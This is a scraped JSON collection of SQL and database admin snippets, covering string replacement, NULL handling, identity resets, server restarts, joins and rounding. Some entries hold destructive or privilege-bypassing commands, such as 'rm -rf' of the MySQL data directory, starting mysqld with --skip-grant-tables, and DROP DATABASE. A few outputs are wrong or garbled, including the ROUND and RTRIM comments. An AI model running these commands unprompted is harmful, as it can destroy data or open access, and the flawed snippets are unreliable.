    "keyword": null,
    "link": null,
    "title": " replace \\n sql",
    "description": "SELECT REPLACE(REPLACE(@str, CHAR(13), ''), CHAR(10), '')\n",
    "reg_date": "2021-10-12T09:59:29.000Z"
  },
  {
    "id": 3471,
    "keyword": null,
    "link": null,
    "title": " replace function in sql",
    "description": "##sql query with replace function #syntax UPDATE tableName SET  column_name = REPLACE(column_name, 'fromStringValue', 'toStringValue');  #Example  Update  tbl_employee Set designation = REPLACE(designation, 'SEO', 'Developer');\nUPDATE employees  SET      phone_number = REPLACE(phone_number, '.', '-');\nUPDATE tableName  SET  fieldName = REPLACE(fieldName, 'fromStringValue', 'toStringValue');\n##sql query with replace function #syntax UPDATE tableName SET  column_name = REPLACE(column_name, 'fromStringValue', 'toStringValue');\nREPLACE function: This function is used  to replace the existing characters of all the occurrences.\nUPDATE employees  SET      phone_number = REPLACE(phone_number, '.', '-');Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:59:29.000Z"
  },
  {
    "id": 3472,
    "keyword": null,
    "link": null,
    "title": " replace multiple string in query sql",
    "description": "select replace(replace(replace(col, '$', ''), '&pound;', ''), 'n/a', '')\n",
    "reg_date": "2021-10-12T09:59:29.000Z"
  },
  {
    "id": 3473,
    "keyword": null,
    "link": null,
    "title": " replace mysql",
    "description": "UPDATE users SET first_name = REPLACE (first_name, 'search', 'replace_with') where id > 0;\nUPDATE     table_name SET     column_name = REPLACE(column_name, 'text to find', 'text to replace with') WHERE     column_name LIKE '%text to find%';\nREPLACE(str, find_string, replace_with) \nUPDATE `table` SET `column` = replace(`column`, 'find text', 'replace text')\nUPDATE products SET  productDescription = REPLACE(productDescription,'abuot','about');\n#REPLACE(string, from_string, new_string) SELECT REPLACE(myText, \"a\", \"b\") as myText FROM tableText;\n",
    "reg_date": "2021-10-12T09:59:29.000Z"
  },
  {
    "id": 3474,
    "keyword": null,
    "link": null,
    "title": " replace null in sql",
    "description": "SELECT IFNULL(Price, 0) FROM Products; SELECT COALESCE(Price, 0) FROM Products; -- Oracle (extra): SELECT NVL(Price, 0) FROM Products;\nCASE WHEN ColumnName IS NULL THEN 'anyText'  ELSE ColumnName END  ---------EXAMPLE -------------------------- SELECT E.Name as Employee, CASE WHEN M.Name IS NULL THEN 'No Manager'     ELSE M.Name END as Manager FROM  tblEmployee E LEFT JOIN tblEmployee M ON   E.ManagerID = M.EmployeeID\n--See records where specific column is NULL SELECT * from table1 WHERE column1 ISNULL   --Update all the NULL values in the selected column UPDATE table1 SET column1 = replace_value WHERE column1 ISNULL\n",
    "reg_date": "2021-10-12T09:59:29.000Z"
  },
  {
    "id": 3475,
    "keyword": null,
    "link": null,
    "title": " replace null value within column mysql",
    "description": "UPDATE `table` SET `somefield`=0 WHERE `somefield` is null\n",
    "reg_date": "2021-10-12T09:59:29.000Z"
  },
  {
    "id": 3476,
    "keyword": null,
    "link": null,
    "title": " replace null with 0 in sql",
    "description": "SELECT IFNULL(Price, 0) FROM Products; SELECT COALESCE(Price, 0) FROM Products; -- Oracle (extra): SELECT NVL(Price, 0) FROM Products;\n--See records where specific column is NULL SELECT * from table1 WHERE column1 ISNULL   --Update all the NULL values in the selected column UPDATE table1 SET column1 = replace_value WHERE column1 ISNULL\n",
    "reg_date": "2021-10-12T09:59:29.000Z"
  },
  {
    "id": 3477,
    "keyword": null,
    "link": null,
    "title": " replace string value in sql",
    "description": "UPDATE employees  SET      phone_number = REPLACE(phone_number, '.', '-');\nUPDATE tableName  SET  fieldName = REPLACE(fieldName, 'fromStringValue', 'toStringValue');\n",
    "reg_date": "2021-10-12T09:59:29.000Z"
  },
  {
    "id": 3478,
    "keyword": null,
    "link": null,
    "title": " replace text in sql",
    "description": "##sql query with replace function #syntax UPDATE tableName SET  column_name = REPLACE(column_name, 'fromStringValue', 'toStringValue');  #Example  Update  tbl_employee Set designation = REPLACE(designation, 'SEO', 'Developer');\n##sql query with replace function #syntax UPDATE tableName SET  column_name = REPLACE(column_name, 'fromStringValue', 'toStringValue');\nREPLACE function: This function is used  to replace the existing characters of all the occurrences.\nUPDATE employees  SET      phone_number = REPLACE(phone_number, '.', '-');Code language: SQL (Structured Query Language) (sql)\nSTUFF Function: This function is used to overwrite existing character or inserts a string into another string.   REPLACE function: This function is used  to replace the existing characters of all the occurrences.\n",
    "reg_date": "2021-10-12T09:59:29.000Z"
  },
  {
    "id": 3479,
    "keyword": null,
    "link": null,
    "title": " rermove categories woocommerce sql",
    "description": "DELETE a,c FROM wp_terms AS a  LEFT JOIN wp_term_taxonomy AS c ON a.term_id = c.term_id LEFT JOIN wp_term_relationships AS b ON b.term_taxonomy_id = c.term_taxonomy_id WHERE c.taxonomy = 'product_tag';  DELETE a,c FROM wp_terms AS a LEFT JOIN wp_term_taxonomy AS c ON a.term_id = c.term_id LEFT JOIN wp_term_relationships AS b ON b.term_taxonomy_id = c.term_taxonomy_id WHERE c.taxonomy = 'product_cat' \n",
    "reg_date": "2021-10-12T09:59:29.000Z"
  },
  {
    "id": 3480,
    "keyword": null,
    "link": null,
    "title": " reseed sql table primary key",
    "description": "DBCC CHECKIDENT('TableName',Reseed,0)\nDBCC CHECKIDENT ('YourTableName', RESEED, 1) \nDBCC CHECKIDENT ('YourTableName', RESEED, 0); \n",
    "reg_date": "2021-10-12T09:59:30.000Z"
  },
  {
    "id": 3481,
    "keyword": null,
    "link": null,
    "title": " reset auto increment mysql",
    "description": "ALTER TABLE table_name AUTO_INCREMENT = 1;\nALTER TABLE `Table Name` AUTO_INCREMENT = 1;\nALTER TABLE tablename AUTO_INCREMENT = 1\nSET  @num := 0;  UPDATE your_table SET id = @num := (@num+1);  ALTER TABLE your_table AUTO_INCREMENT =1;\nALTER SEQUENCE users_id_seq RESTART WITH 1; #\t\t\t\t|     | #            TABLE  COLUMN\n",
    "reg_date": "2021-10-12T09:59:30.000Z"
  },
  {
    "id": 3482,
    "keyword": null,
    "link": null,
    "title": " reset identity column in sql server",
    "description": "\tDBCC CHECKIDENT ('table name', RESEED , 0)\nUSE AdventureWorks2012;   GO   DBCC CHECKIDENT ('Person.AddressType', RESEED, 10);   GO   \nDBCC CHECKIDENT ('YourTableName', RESEED, 1)\nDBCC CHECKIDENT ('YourTableName', RESEED, 1) \nUSE <databasename>;   GO   DBCC CHECKIDENT ('<tablename>.<columnname>', <value>, <incrementby>);   GO \n",
    "reg_date": "2021-10-12T09:59:30.000Z"
  },
  {
    "id": 3483,
    "keyword": null,
    "link": null,
    "title": " reset identity column values in sql server",
    "description": "\tDBCC CHECKIDENT ('table name', RESEED , 0)\nDBCC CHECKIDENT ('YourTableName', RESEED, 1)\n/*If you have delete all the rows in a table, and you want to reset the identity column value, use this*/ DBCC CHECKIDENT ('Table_Name',RESEED,0)\nUSE <databasename>;   GO   DBCC CHECKIDENT ('<tablename>.<columnname>', <value>, <incrementby>);   GO \n",
    "reg_date": "2021-10-12T09:59:30.000Z"
  },
  {
    "id": 3484,
    "keyword": null,
    "link": null,
    "title": " reset mysql root password mac",
    "description": "MacOSX MySql root Password Reset master solution Step by step guide- $ brew services stop mysql $ pkill mysqld $ rm -rf /usr/local/var/mysql/ # NOTE: this will delete your existing database!!! $ brew postinstall mysql $ brew services restart mysql $ mysql -u root\nMake sure you have Stopped MySQL first (above). Run the server in safe mode with privilege bypass: sudo mysqld_safe --skip-grant-tables mysql -u root UPDATE mysql.user SET authentication_string=null WHERE User='root'; FLUSH PRIVILEGES; exit; Then mysql -u root ALTER USER 'root'@'localhost' IDENTIFIED WITH caching_sha2_password BY 'yourpasswd';\n",
    "reg_date": "2021-10-12T09:59:30.000Z"
  },
  {
    "id": 3485,
    "keyword": null,
    "link": null,
    "title": " reset mysql root password using alter user statement",
    "description": "Set / change / reset the MySQL root password on Ubuntu Linux. Enter the following lines in your terminal.  Stop the MySQL Server: sudo /etc/init.d/mysql stop Start the mysqld configuration: sudo mysqld --skip-grant-tables &  In some cases, you've to create the /var/run/mysqld first:  sudo mkdir -v /var/run/mysqld && sudo chown mysql /var/run/mysqld Run: sudo service mysql start Login to MySQL as root: mysql -u root mysql Replace YOURNEWPASSWORD with your new password:  UPDATE   mysql.user SET   Password = PASSWORD('YOURNEWPASSWORD') WHERE   User = 'root'; FLUSH PRIVILEGES; exit; Note: on some versions, if password column doesn't exist, you may want to try: UPDATE user SET authentication_string=password('YOURNEWPASSWORD') WHERE user='root';  Note: This method is not regarded as the most secure way of resetting the password, however, it works.\nALTER USER 'root'@'localhost' IDENTIFIED BY 'my_password';\n",
    "reg_date": "2021-10-12T09:59:30.000Z"
  },
  {
    "id": 3486,
    "keyword": null,
    "link": null,
    "title": " reset postgres table index to next max value",
    "description": "SELECT SETVAL('some_table_id_seq',MAX(id)+1) FROM some_table \n",
    "reg_date": "2021-10-12T09:59:30.000Z"
  },
  {
    "id": 3487,
    "keyword": null,
    "link": null,
    "title": " restart for pg hba.conf file",
    "description": "SELECT pg_reload_conf(); \n",
    "reg_date": "2021-10-12T09:59:30.000Z"
  },
  {
    "id": 3488,
    "keyword": null,
    "link": null,
    "title": " restart identity cascade",
    "description": "TRUNCATE <table_name> RESTART IDENTITY CASCADE; --RESTART will reset the identity sequence --CASCADE all tables that have a foreign key reference to  --table_name will be truncated as well\nTRUNCATE bigtable, fattable RESTART IDENTITY;\n",
    "reg_date": "2021-10-12T09:59:30.000Z"
  },
  {
    "id": 3489,
    "keyword": null,
    "link": null,
    "title": " restart mysql mac",
    "description": "sudo /usr/local/mysql/support-files/mysql.server restart\n# mysql start/stop/restart # MAC $ cd /Applications/Ampps/mysql/bin $ mysql.server restart #Linux $ /etc/init.d/mysqld restart or $ service mysqld restart or $ systemctl restart mysqld\nalias mysqlstart='sudo /usr/local/mysql/support-files/mysql.server start' alias mysqlstop='sudo /usr/local/mysql/support-files/mysql.server stop' \n",
    "reg_date": "2021-10-12T09:59:30.000Z"
  },
  {
    "id": 3490,
    "keyword": null,
    "link": null,
    "title": " restart mysql server ubuntu",
    "description": "##  mariadb ## systemctl start mariadb ## mysql  systemctl start mysqld\n                                     service mysqld restart \nservice mysql restart\n",
    "reg_date": "2021-10-12T09:59:30.000Z"
  },
  {
    "id": 3491,
    "keyword": null,
    "link": null,
    "title": " restart postgresql.service Failed to restart postgresql.service: Unit not found.",
    "description": "systemctl list-units|grep postgresql service postgresql-12.service restart\n",
    "reg_date": "2021-10-12T09:59:31.000Z"
  },
  {
    "id": 3492,
    "keyword": null,
    "link": null,
    "title": " restart postgresql",
    "description": "sudo service postgresql restart \nsudo service postgresql restart # To restart the postgresql service\nsudo service postgresql start\nsudo /etc/init.d/postgresql restart\nsudo service postgresql restart\n                                                     pg_ctl -D \"C:\\Program Files\\PostgreSQL\\12\\data\" restartCode language: JavaScript (javascript)\n",
    "reg_date": "2021-10-12T09:59:31.000Z"
  },
  {
    "id": 3493,
    "keyword": null,
    "link": null,
    "title": " restart sql server command line linux",
    "description": "service mysql start service mysql stop service mysql restart \n",
    "reg_date": "2021-10-12T09:59:31.000Z"
  },
  {
    "id": 3494,
    "keyword": null,
    "link": null,
    "title": " restore backup mysql .gz",
    "description": "gunzip < yourDatabaseName.sql.gz | mysql -u root -p yourDatabaseName\n",
    "reg_date": "2021-10-12T09:59:31.000Z"
  },
  {
    "id": 3495,
    "keyword": null,
    "link": null,
    "title": " restore postgres database from sql file",
    "description": "psql -U postgres -h localhost -p 5432 -f data_dump.sql\npsql -d database_name -f backup.sql\n#To dump a database called mydb into a SQL-script file: pg_dump mydb > db.sql  #To reload such a script into a (freshly created) database named newdb: psql -d newdb -f db.sql\n",
    "reg_date": "2021-10-12T09:59:31.000Z"
  },
  {
    "id": 3496,
    "keyword": null,
    "link": null,
    "title": " return columns from table sql",
    "description": "SELECT * FROM INFORMATION_SCHEMA.COLUMNS  WHERE TABLE_NAME = N'Customers'  -- INFORMATION_SCHEMA is an ANSI-standard (American National Standard Institute) set of read-only views which provide information about all of the tables, views, columns, and procedures in a database -- \"N\" defines the subsequent string (the string after the N) as being in unicode\nSELECT * FROM INFORMATION_SCHEMA.COLUMNS -- INFORMATION_SCHEMA is an ANSI-standard (American National Standard Institute) set of read-only views which provide information about all of the tables, views, columns, and procedures in a database WHERE TABLE_NAME = N'Customers' -- \"N\" defines the subsequent string (the string after the N) as being in unicode\n",
    "reg_date": "2021-10-12T09:59:31.000Z"
  },
  {
    "id": 3497,
    "keyword": null,
    "link": null,
    "title": " return insert results in POSTGRESQL",
    "description": "# to select specific columns INSERT INTO users (firstname, lastname) VALUES ('Joe', 'Cool') RETURNING id, firstname; # to return every column INSERT INTO users (firstname, lastname) VALUES ('Joe', 'Cool') RETURNING *;\n",
    "reg_date": "2021-10-12T09:59:31.000Z"
  },
  {
    "id": 3498,
    "keyword": null,
    "link": null,
    "title": " return the number of records in a single table mysql",
    "description": "mysql> SELECT table_name, table_rows    ->FROM INFORMATION_SCHEMA.TABLES    ->WHERE TABLE_SCHEMA = 'business';\nSELECT      COUNT(*) FROM     customers; Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:59:31.000Z"
  },
  {
    "id": 3499,
    "keyword": null,
    "link": null,
    "title": " reutrn string after character sql",
    "description": "select right(col, charindex('-', reverse(col)) - 1)\n",
    "reg_date": "2021-10-12T09:59:31.000Z"
  },
  {
    "id": 3500,
    "keyword": null,
    "link": null,
    "title": " revokeprivileges mysql",
    "description": "REVOKE ALL ON dbname.* FROM 'username'@'localhost';\n",
    "reg_date": "2021-10-12T09:59:32.000Z"
  },
  {
    "id": 3501,
    "keyword": null,
    "link": null,
    "title": " right join",
    "description": "SELECT * FROM table_1 RIGHT JOIN table_2 ON table_1.common_field = table_2.common_field;\n#The RIGHT JOIN keyword Return all rows from the right table (table_name2), even if there are no #matches in the left table (table_name1).  syntax->SELECT column_name(s) FROM table_name1 RIGHT JOIN table_name2 ON table_name1.column_name=table_name2.column_name  ////example//// SELECT Persons.LastName, Persons.FirstName, Orders.OrderNo FROM Persons RIGHT JOIN Orders ON Persons.P_Id=Orders.P_Id ORDER BY Persons.LastName  \nRIGHT JOIN: Matching part from both table and unmatching part from right table.\nSELECT table1.column1, table2.column2... FROM table1 RIGHT JOIN table2 ON table1.common_field = table2.common_field;\n123SELECT columns  FROM table_A  LEFT JOIN table_B ON join_conditionsXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nMatching part from both table and unmatching part from left table.\n",
    "reg_date": "2021-10-12T09:59:32.000Z"
  },
  {
    "id": 3502,
    "keyword": null,
    "link": null,
    "title": " right join sql",
    "description": "SELECT table1.column1, table2.column2... FROM table1 LEFT JOIN table2 ON table1.common_field = table2.common_field; \nSELECT * FROM table_1 RIGHT JOIN table_2 ON table_1.common_field = table_2.common_field;\n#The RIGHT JOIN keyword Return all rows from the right table (table_name2), even if there are no #matches in the left table (table_name1).  syntax->SELECT column_name(s) FROM table_name1 RIGHT JOIN table_name2 ON table_name1.column_name=table_name2.column_name  ////example//// SELECT Persons.LastName, Persons.FirstName, Orders.OrderNo FROM Persons RIGHT JOIN Orders ON Persons.P_Id=Orders.P_Id ORDER BY Persons.LastName  \n-- LEFT OUTER JOIN is equivalent to LEFT JOIN -- b.VALUE1 is null when ID not in table2 (idem for c.VALUE1 in table3) SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    LEFT OUTER JOIN table2 b ON a.ID = b.ID   LEFT OUTER JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000;  -- &dArr; Test it &dArr; (Fiddle source link)\nRIGHT JOIN: Matching part from both table and unmatching part from right table.\n#LEFT JOIN: Return all rows from the left table, even if there are no matches in the right #table  syntax->SELECT column_name(s) FROM table_name1 LEFT JOIN table_name2 ON table_name1.column_name=table_name2.column_name  ////example///// SELECT Persons.LastName, Persons.FirstName, Orders.OrderNo FROM Persons LEFT JOIN Orders ON Persons.P_Id=Orders.P_Id ORDER BY Persons.LastName  \n",
    "reg_date": "2021-10-12T09:59:32.000Z"
  },
  {
    "id": 3503,
    "keyword": null,
    "link": null,
    "title": " roll up oracle",
    "description": "-- In addition to the regular aggregation results we expect from the -- GROUP BY clause, the ROLLUP extension produces group subtotals from  -- right to left and a grand total. If \"n\" is the number of  -- columns listed in the ROLLUP, there will be n+1 levels of subtotals.  SELECT fact_1_id,        fact_2_id,        fact_3_id,        SUM(sales_value) AS sales_value FROM   dimension_tab GROUP BY ROLLUP (fact_1_id, fact_2_id, fact_3_id) ORDER BY fact_1_id, fact_2_id, fact_3_id;        \n",
    "reg_date": "2021-10-12T09:59:32.000Z"
  },
  {
    "id": 3504,
    "keyword": null,
    "link": null,
    "title": " rollback in sql",
    "description": "ROLLBACK;\t\t-- recover datas back to previous commit in current session\nDELETE clause is from DML, we can use ROLLBACK to recover the data. &bull; ROLLBACK &mdash;> discharges all pending changes to prev commit &bull; ROLLBACK TO name &mdash;> rolls back changes to savepoint\nes, since this DELETE clause is from DML, we can use ROLLBACK to recover the data.\nROLLBACK;\t\t-- instead of commit\n&bull; ROLLBACK TO name &mdash;> rolls back changes to savepoint\n",
    "reg_date": "2021-10-12T09:59:32.000Z"
  },
  {
    "id": 3505,
    "keyword": null,
    "link": null,
    "title": " round bigquery",
    "description": "round(numeric_value, integer_value)\n",
    "reg_date": "2021-10-12T09:59:32.000Z"
  },
  {
    "id": 3506,
    "keyword": null,
    "link": null,
    "title": " round decimal mysql",
    "description": "SELECT ROUND(20.555, 1); -- 20.5 SELECT ROUND(20.5, 0); -- 21 \nround(column)\n",
    "reg_date": "2021-10-12T09:59:32.000Z"
  },
  {
    "id": 3507,
    "keyword": null,
    "link": null,
    "title": " round in sql",
    "description": "SELECT CAST(ROUND(125.025000, 2) AS NUMERIC(36,2)) returns: 125.03\nSELECT 2.555555; --> Result 2.555555 SELECT ROUND(2.555555); --> Result 3 SELECT ROUND(2.555555, 3); --> Result 2.556 SELECT ROUND(2.555555, 0); --> Result 3\nSELECT ROUND (commission_pct, 0) From employees;\nSQL ROUND UP AND ROUND DOWN\n",
    "reg_date": "2021-10-12T09:59:32.000Z"
  },
  {
    "id": 3508,
    "keyword": null,
    "link": null,
    "title": " round one decimal place mysql",
    "description": "SELECT ROUND(20.555, 1); -- 20.5 SELECT ROUND(20.5, 0); -- 21 \nround(column)\n",
    "reg_date": "2021-10-12T09:59:32.000Z"
  },
  {
    "id": 3509,
    "keyword": null,
    "link": null,
    "title": " row number mssql",
    "description": "USE AdventureWorks2012;   GO   SELECT FirstName, LastName, TerritoryName, ROUND(SalesYTD,2,1) AS SalesYTD,   ROW_NUMBER() OVER(PARTITION BY TerritoryName ORDER BY SalesYTD DESC)    AS Row   FROM Sales.vSalesPerson   WHERE TerritoryName IS NOT NULL AND SalesYTD <> 0   ORDER BY TerritoryName;   \nSELECT     ROW_NUMBER() OVER (  ORDER BY first_name    ) row_num,    first_name,     last_name,     city FROM     sales.customers; \nROW_NUMBER() OVER (ORDER BY 'Column_Name' DESC) as ROW_NUMBER   select ROW_NUMBER() OVER(PARTITION BY WorkOrderID ORDER BY WorkOrderID ASC)      AS Row#, * from TableName\n                                     SELECT     ROW_NUMBER() OVER ( \tORDER BY first_name    ) row_num,    first_name,     last_name,     city FROM     sales.customers;\nUSE AdventureWorks2012;   GO   WITH OrderedOrders AS   (       SELECT SalesOrderID, OrderDate,       ROW_NUMBER() OVER (ORDER BY OrderDate) AS RowNumber       FROM Sales.SalesOrderHeader    )    SELECT SalesOrderID, OrderDate, RowNumber     FROM OrderedOrders    WHERE RowNumber BETWEEN 50 AND 60;   \n",
    "reg_date": "2021-10-12T09:59:32.000Z"
  },
  {
    "id": 3510,
    "keyword": null,
    "link": null,
    "title": " row number mysql",
    "description": "//number of rows retrieved from a query <?php  $link = mysql_connect(\"localhost\", \"mysql_user\", \"mysql_password\"); mysql_select_db(\"database\", $link);  $result = mysql_query(\"SELECT * FROM table1\", $link); $num_rows = mysql_num_rows($result);  echo \"$num_rows Rows\\n\";  ?>  \nSELECT row_number() over ( order by firstName) RowNumberSqeuence,FirstName from rowNumberDemo  order by FirstName;\n                                     set @row_number := 0;  SELECT      @row_number:=CASE         WHEN @customer_no = customerNumber  \t\t\tTHEN @row_number + 1         ELSE 1     END AS num,     @customer_no:=customerNumber customerNumber,     paymentDate,     amount FROM     payments ORDER BY customerNumber;\nSET @row_number = 0;  SELECT      (@row_number:=@row_number + 1) AS num,      firstName,      lastName FROM     employees ORDER BY firstName, lastName     LIMIT 5;\n",
    "reg_date": "2021-10-12T09:59:33.000Z"
  },
  {
    "id": 3511,
    "keyword": null,
    "link": null,
    "title": " rows to comma separated values in mssql",
    "description": "DECLARE @test NVARCHAR(max)   SELECT @test = COALESCE(@test + ',', '') + field2 FROM #test SELECT field2 = @test \n",
    "reg_date": "2021-10-12T09:59:33.000Z"
  },
  {
    "id": 3512,
    "keyword": null,
    "link": null,
    "title": " rtrim sql",
    "description": "SELECT TRIM('   Exemple   ');\t\t\t\t\t\t-- 'Exemple' SELECT LTRIM('   Exemple   ');\t\t\t\t\t\t-- 'Exemple   ' SELECT RTRIM('   Exemple   ');\t\t\t\t\t\t-- '   Exemple' SELECT TRIM(BOTH 'x' FROM 'xxxExemplexxx');\t\t\t-- 'Exemple' SELECT TRIM(LEADING 'x' FROM 'xxxExemplexxx');\t\t-- 'Exemplexxx' SELECT LTRIM('xxxExemplexxx', 'x');\t\t\t\t\t-- 'Exemplexxx' SELECT TRIM(TRAILING 'x' FROM 'xxxExemplexxx'); \t-- 'xxxExemple' SELECT RTRIM('xxxExemple', 'x');\t\t\t\t\t-- 'Exemplexxx'\nSELECT RTRIM('SQL Tutorial     ') AS RightTrimmedString;\n",
    "reg_date": "2021-10-12T09:59:33.000Z"
  },
  {
    "id": 3513,
    "keyword": null,
    "link": null,
    "title": " run docker container with database as rds metabase",
    "description": "docker run -d -p 3000:3000 \\   -e \"MB_DB_TYPE=postgres\" \\   -e \"MB_DB_DBNAME=metabase\" \\   -e \"MB_DB_PORT=5432\" \\   -e \"MB_DB_USER=<username>\" \\   -e \"MB_DB_PASS=<password>\" \\   -e \"MB_DB_HOST=my-database-host\" \\   --name metabase metabase/metabase \n",
    "reg_date": "2021-10-12T09:59:33.000Z"
  },
  {
    "id": 3514,
    "keyword": null,
    "link": null,
    "title": " run mssql server terminal",
    "description": "wget -qO- https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add - \n",
    "reg_date": "2021-10-12T09:59:33.000Z"
  },
  {
    "id": 3515,
    "keyword": null,
    "link": null,
    "title": " run multiple sql commands at once",
    "description": "$query  = \"SQL Code\"; $query .= \"SQL Code\"; //execute query if($result = mysqli_multi_query($conn, $query)) { \techo \"DONE!\"; }else{ \techo \"Something went wrong :(\"; }\n",
    "reg_date": "2021-10-12T09:59:33.000Z"
  },
  {
    "id": 3516,
    "keyword": null,
    "link": null,
    "title": " run mysql command from bash",
    "description": "mysql --user=\"$user\" --password=\"$password\" --database=\"$database\" --execute=\"DROP DATABASE $user; CREATE DATABASE $database;\" \napt-get install mysql-server\n",
    "reg_date": "2021-10-12T09:59:33.000Z"
  },
  {
    "id": 3517,
    "keyword": null,
    "link": null,
    "title": " run mysql instance in docker",
    "description": "$ docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag\n",
    "reg_date": "2021-10-12T09:59:33.000Z"
  },
  {
    "id": 3518,
    "keyword": null,
    "link": null,
    "title": " run mysql xampp shell",
    "description": "mysql -u root mysql\n",
    "reg_date": "2021-10-12T09:59:33.000Z"
  },
  {
    "id": 3519,
    "keyword": null,
    "link": null,
    "title": " run postgresql dump to csv",
    "description": "                                     \\copy (SELECT * FROM persons) to 'C:\\tmp\\persons_client.csv' with csv\n",
    "reg_date": "2021-10-12T09:59:33.000Z"
  },
  {
    "id": 3520,
    "keyword": null,
    "link": null,
    "title": " run sql script from command line",
    "description": "#Integrated Security sqlcmd -S Serverinstance -E -i import_file.sql #UserName and Password sqlcmd -S <server Name> -U sa -P sapassword -i inputquery_file_name -o outputfile_name \nsqlplus username/password@service\t-- OR sqlplus / as sysdba  SQL> SELECT sysdate FROM dual;  SQL> @C:\\Users\\folder\\script.sql -- OR  SQL> START C:\\Users\\folder\\script.sql\nmysql -u yourUserName -p yourDatabaseName < yourFileName.sql\nsqlplus username/password@service\t-- OR sqlplus / as sysdba  SQL> SELECT * FROM dual;\n",
    "reg_date": "2021-10-12T09:59:34.000Z"
  },
  {
    "id": 3521,
    "keyword": null,
    "link": null,
    "title": " run stored procedure sql",
    "description": "-- Datagrip:  call MY_SCHEMA.my_procedure(); -- SQL Developer exec MY_SCHEMA.my_procedure(); -- Shorter than : BEGIN \tMY_SCHEMA.my_procedure(); END;\n",
    "reg_date": "2021-10-12T09:59:34.000Z"
  },
  {
    "id": 3522,
    "keyword": null,
    "link": null,
    "title": " running external script mysql command",
    "description": "Copied shell> mysql db_name < text_file\nCopied mysql> source file_name mysql> \\. file_name\n",
    "reg_date": "2021-10-12T09:59:34.000Z"
  },
  {
    "id": 3523,
    "keyword": null,
    "link": null,
    "title": " running percentage of total postgres",
    "description": "SELECT   *,  (value / SUM(value) OVER ()) AS \"% of total\" FROM   transactions WHERE   quarter = '2015-03-31' and company_id = 1;\n",
    "reg_date": "2021-10-12T09:59:34.000Z"
  },
  {
    "id": 3524,
    "keyword": null,
    "link": null,
    "title": " sQL query to get all table records count from a database",
    "description": "DECLARE @TableRowCounts TABLE ([TableName] VARCHAR(128), [RowCount] INT) ; INSERT INTO @TableRowCounts ([TableName], [RowCount]) EXEC sp_MSforeachtable 'SELECT ''?'' [TableName], COUNT(*) [RowCount] FROM ?' ; SELECT [TableName], [RowCount] FROM @TableRowCounts ORDER BY [TableName] GO \n",
    "reg_date": "2021-10-12T09:59:34.000Z"
  },
  {
    "id": 3525,
    "keyword": null,
    "link": null,
    "title": " safe mode off mysql",
    "description": "SET SQL_SAFE_UPDATES = 0;\nSET SQL_SAFE_UPDATES = 0; \nUPDATE tablename SET columnname=1;\n",
    "reg_date": "2021-10-12T09:59:34.000Z"
  },
  {
    "id": 3526,
    "keyword": null,
    "link": null,
    "title": " safe update mysql",
    "description": "SET SQL_SAFE_UPDATES = 0;\nUPDATE tablename SET columnname=1;\n",
    "reg_date": "2021-10-12T09:59:34.000Z"
  },
  {
    "id": 3527,
    "keyword": null,
    "link": null,
    "title": " sample clause in sql",
    "description": " Using a SAMPLE clause, we can select random rows. SELECT * FROM table_name SAMPLE(10);\n",
    "reg_date": "2021-10-12T09:59:34.000Z"
  },
  {
    "id": 3528,
    "keyword": null,
    "link": null,
    "title": " sample in sql",
    "description": " Using a SAMPLE clause, we can select random rows. SELECT * FROM table_name SAMPLE(10);\n",
    "reg_date": "2021-10-12T09:59:34.000Z"
  },
  {
    "id": 3529,
    "keyword": null,
    "link": null,
    "title": " sample table creation in sql with data",
    "description": "CREATE TABLE table_name(   \tid INT AUTO_INCREMENT PRIMARY KEY,     \tname VARCHAR(255), # String 255 chars max   \tdate DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,   \tlongtext BLOB );\nCREATE TABLE recipe_ingredients (   recipe_id int NOT NULL,    ingredient_id INT NOT NULL,    amount INT NOT NULL,   PRIMARY KEY (recipe_id,ingredient_id) );  INSERT INTO recipe_ingredients      (recipe_id, ingredient_id, amount) VALUES     (1,1,1),     (1,2,2),     (1,3,2),     (1,4,3),     (1,5,1),     (2,3,2),     (2,6,1),     (3,5,1),     (3,7,2); \nCREATE TABLE table_name (     column1 datatype,     column2 datatype,     column3 datatype,    .... ); \n",
    "reg_date": "2021-10-12T09:59:34.000Z"
  },
  {
    "id": 3530,
    "keyword": null,
    "link": null,
    "title": " savepoint in sql",
    "description": "&bull; SAVEPOINT name &mdash;> marks a save point &bull; COMMIT &mdash;> making all pending changes permanent; &bull; ROLLBACK &mdash;> discharges all pending changes to prev commit &bull; ROLLBACK TO name &mdash;> rolls back changes to savepoint\n",
    "reg_date": "2021-10-12T09:59:35.000Z"
  },
  {
    "id": 3531,
    "keyword": null,
    "link": null,
    "title": " scaffold mysql database",
    "description": "Scaffold-DbContext \"server=(ip address);user=(username);password=(Password);database=(database name)\" \"Pomelo.EntityFrameworkCore.MySql\" -OutputDir (folder name) -f\n",
    "reg_date": "2021-10-12T09:59:35.000Z"
  },
  {
    "id": 3532,
    "keyword": null,
    "link": null,
    "title": " scaffold npgsql net core",
    "description": "dotnet ef dbcontext scaffold \"Host=localhost;Database=mydatabase;Username=myuser;Password=mypassword\" Npgsql.EntityFrameworkCore.PostgreSQL -o Models\n",
    "reg_date": "2021-10-12T09:59:35.000Z"
  },
  {
    "id": 3533,
    "keyword": null,
    "link": null,
    "title": " script to add datafile to tablespace",
    "description": "SELECT * FROM DBA_DATA_FILES WHERE TABLESPACE_NAME = 'my_tbs' ORDER BY FILE_NAME;  ALTER TABLESPACE my_tbs ADD DATAFILE '/path/to/my_file.dbf'  \tSIZE 100M AUTOEXTEND OFF; -- Autoextend with max size: ALTER TABLESPACE my_tbs ADD DATAFILE '/path/to/my_file.dbf'  \tSIZE 10G AUTOEXTEND ON NEXT 1G MAXSIZE 32000M;     -- For TEMP tablespace: ALTER TABLESPACE my_tbs ADD TEMPFILE '/path/to/my_file.dbf'  \tSIZE 100M AUTOEXTEND OFF;\n",
    "reg_date": "2021-10-12T09:59:35.000Z"
  },
  {
    "id": 3534,
    "keyword": null,
    "link": null,
    "title": " script to add new column in table sql",
    "description": "ALTER TABLE Customers ADD Email varchar(255); \nALTER TABLE table_name ADD column_name datatype;\n                                                     ALTER TABLE vendors ADD COLUMN phone VARCHAR(15) AFTER name; Code language: SQL (Structured Query Language) (sql)\n",
